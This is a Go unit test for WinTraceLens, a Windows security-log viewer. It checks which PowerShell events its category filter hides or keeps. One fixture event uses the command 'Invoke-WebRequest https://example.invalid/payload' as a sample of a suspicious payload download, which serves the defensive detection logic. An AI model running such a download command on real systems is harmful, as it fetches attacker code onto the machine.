package server

import (
	"testing"

	"github.com/ruiwenya/WinTraceLens/internal/securitylog"
)

func TestSecurityCategoryMatchesHidesRoutinePowerShellFromAll(t *testing.T) {
	routine := securitylog.Event{Category: "PowerShell日志", EventID: "600", Message: "Provider started"}
	if securityCategoryMatches(routine, "all") {
		t.Fatal("routine PowerShell provider event should be hidden from all-events output")
	}
	if securityCategoryMatches(routine, "powershell") {
		t.Fatal("routine PowerShell provider event should be hidden from the dedicated display")
	}
}

func TestSecurityCategoryMatchesKeepsSuspiciousPowerShell(t *testing.T) {
	suspicious := securitylog.Event{Category: "PowerShell日志", EventID: "4103", Command: "Invoke-WebRequest https://example.invalid/payload"}
	if !securityCategoryMatches(suspicious, "all") {
		t.Fatal("suspicious PowerShell event should remain in all-events output")
	}
}

func TestSecurityCategoryMatchesHidesCollectorOnlyFromDefaultView(t *testing.T) {
	collector := securitylog.Event{Category: "PowerShell日志", EventID: "4104", Command: "WTLCollectorMarker"}
	if securityCategoryMatches(collector, "all") {
		t.Fatal("collector event should be hidden from the default display")
	}
	if securityCategoryMatches(collector, "powershell") {
		t.Fatal("collector event should be hidden from the dedicated PowerShell display")
	}
}
